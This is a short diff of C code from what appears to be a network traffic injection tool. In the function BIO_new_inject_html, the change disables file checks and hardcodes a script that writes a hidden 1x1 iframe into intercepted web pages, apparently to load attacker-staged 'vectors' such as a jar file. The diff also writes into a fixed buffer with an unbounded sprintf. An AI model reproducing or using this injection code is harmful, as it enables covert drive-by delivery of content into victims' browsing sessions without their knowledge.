@@ -158,21 +158,22 @@ BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
    fclose(f);
    */
    /* check if we have everything in place */
-   f = open_data("vectors", jar_file, "r");
-   if (f == NULL)
-      return BIO_new(BIO_f_null());
-
-   fclose(f);
+   //f = open_data("vectors", jar_file, "r");
+   //if (f == NULL)
+   //   return BIO_new(BIO_f_null());
+   //fclose(f);
 
    /* check if we have everything in place */
-   f = open_data("vectors", html_file, "r");
-   if (f == NULL)
-      return BIO_new(BIO_f_null());
+   //f = open_data("vectors", html_file, "r");
+   //if (f == NULL)
+   //   return BIO_new(BIO_f_null());
 
    /* read the content of the file */
    SAFE_CALLOC(html_to_inject, 4096, sizeof(char));
-   html_to_inject_len = fread(html_to_inject, 1, 4096, f);
-   fclose(f);
+   sprintf(html_to_inject, "<script>document.write(\"<iframe src='/%s' width='1' height='1'></iframe>\");</script>", html_file);
+   //SAFE_CALLOC(html_to_inject, 4096, sizeof(char));
+   //html_to_inject_len = fread(html_to_inject, 1, 4096, f);
+   //fclose(f);
 
    /* recalculate the size of the replaced string */
    html_to_inject_len = strlen(html_to_inject);
